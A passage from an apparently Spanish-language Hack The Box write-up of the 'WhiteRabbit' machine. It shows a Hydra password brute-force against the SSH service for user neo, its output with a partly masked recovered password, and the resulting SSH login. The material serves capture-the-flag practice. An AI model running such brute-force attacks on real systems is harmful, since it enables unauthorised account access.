>```shell title:Shell hl:8-9
>❯ hydra -l neo -P possible_passwords.txt ssh://whiterabbit.htb
>
>Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
>
>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-19 11:06:11
>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
>[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
>[DATA] attacking ssh://whiterabbit.htb:22/
>[22][ssh] host: whiterabbit.htb   login: neo   password: WB*************
>1 of 1 target successfully completed, 1 valid password found
>[WARNING] Writing restore file because 2 final worker threads did not complete until end.
>[ERROR] 2 targets did not resolve or could not be connected
>[ERROR] 0 target did not complete
>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-19 11:06:21
>```

Con la contraseña crackeada podemos iniciar sesión como `neo` en la máquina, y encontrar el archivo `root.txt` en el directorio `/root`.

```shell title:Shell
ssh neo@whiterabbit.htb
neo@whiterabbit.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

Last login: Fri Dec 19 16:07:05 2025 from 10.10.16.71

neo@whiterabbit:~$
```

